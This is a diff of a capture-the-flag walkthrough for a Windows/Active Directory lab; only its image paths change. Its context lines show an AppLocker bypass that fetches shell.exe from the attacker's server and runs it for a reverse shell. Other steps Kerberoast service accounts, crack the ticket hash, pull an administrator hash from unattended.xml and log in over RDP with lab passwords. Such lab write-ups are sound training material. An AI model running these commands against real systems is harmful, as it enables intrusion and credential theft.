@@ -32,7 +32,7 @@ You will have noticed that with the deployed machine, you cannot execute your bi
 
 We need to answer this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531150543.png)
+![](cybersecurity/images/Pasted%2520image%252020250531150543.png)
 
 We are told we can bypass the `applocker` restriction by dropping a file inside of 
 
@@ -63,7 +63,7 @@ We need to connect to RDP, we can use:
 xfreerdp /u:corp\\dark /p:_QuejVudId6 /v:10.10.253.99 /size:1440x1080 +clipboard +fonts /cert:ignore
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531151311.png)
+![](cybersecurity/images/Pasted%2520image%252020250531151311.png)
 
 On here, let's host the python server and use Powershell to download the file into the whitelisted path:
 
@@ -71,7 +71,7 @@ On here, let's host the python server and use Powershell to download the file in
 Invoke-WebRequest -Uri http://10.14.21.28:8000/shell.exe -OutFile C:/Windows/System32/spool/drivers/color/shell.exe
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531151710.png)
+![](cybersecurity/images/Pasted%2520image%252020250531151710.png)
 
 We can see the request was successful, now, we can execute the file and receive a shell in our listener:
 
@@ -89,7 +89,7 @@ Now, for the flag, we can use:
 Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531152244.png)
+![](cybersecurity/images/Pasted%2520image%252020250531152244.png)
 
 Got our flag:
 
@@ -113,7 +113,7 @@ Kerberos is the authentication system for Windows and Active Directory networks.
 ## Practical
 ---
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531152426.png)
+![](cybersecurity/images/Pasted%2520image%252020250531152426.png)
 
 Nice, we need to do the following:
 
@@ -121,7 +121,7 @@ Nice, we need to do the following:
 setspn -T medin -Q */*
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531152549.png)
+![](cybersecurity/images/Pasted%2520image%252020250531152549.png)
 
 We now need to download the `Invoke-Kerberoast.ps1` script, for this, download it on our host machine and host it as before:
 
@@ -135,11 +135,11 @@ Once you start the python server, do:
 Invoke-WebRequest -Uri http://10.14.21.28:8000/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531152834.png)
+![](cybersecurity/images/Pasted%2520image%252020250531152834.png)
 
 We'll see the request on our server, also, the file is now on our directory we downloaded it:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531152908.png)
+![](cybersecurity/images/Pasted%2520image%252020250531152908.png)
 
 Let's use it:
 
@@ -148,7 +148,7 @@ Let's use it:
 Invoke-Kerberoast -OutputFormat hashcat |fl
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531153500.png)
+![](cybersecurity/images/Pasted%2520image%252020250531153500.png)
 
 There we go, we got our `TGS`, let's use hashcat to crack it:
 
@@ -180,17 +180,17 @@ We need to use `rdp` again:
 xfreerdp /u:corp\\fela /p:"rubenF124" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531154205.png)
+![](cybersecurity/images/Pasted%2520image%252020250531154205.png)
 
 We can see our flag:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531154311.png)
+![](cybersecurity/images/Pasted%2520image%252020250531154311.png)
 
 ```
 flag{bde1642535aa396d2439d86fe54a36e4}
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531154304.png)
+![](cybersecurity/images/Pasted%2520image%252020250531154304.png)
 
 
 # Privilege Escalation
@@ -204,7 +204,7 @@ We will use a PowerShell enumeration script to examine the Windows machine. We c
 ## Practical
 ----
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531160234.png)
+![](cybersecurity/images/Pasted%2520image%252020250531160234.png)
 
 Same procedure as the last task:
 
@@ -216,7 +216,7 @@ Invoke-WebRequest -Uri http://10.14.21.28:8000/PowerUp.ps1 -OutFile PowerUp.ps1
 We can now read `unattended.xml`:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531160740.png)
+![](cybersecurity/images/Pasted%2520image%252020250531160740.png)
 
 We got this hash:
 
@@ -236,19 +236,19 @@ We got it, let's go into rdp and get our flag:
 xfreerdp /u:Administrator /p:"tqjJpEX9Qv8ybKI3yHcc=L\!5e(\!wW;\$T" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531161032.png)
+![](cybersecurity/images/Pasted%2520image%252020250531161032.png)
 
 We need to change password, change it to anything.
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531161948.png)
+![](cybersecurity/images/Pasted%2520image%252020250531161948.png)
 
 Now, we can read our flag:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531162002.png)
+![](cybersecurity/images/Pasted%2520image%252020250531162002.png)
 
 ```
 THM{g00d_j0b_SYS4DM1n_M4s73R}
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250531162040.png)
+![](cybersecurity/images/Pasted%2520image%252020250531162040.png)
 
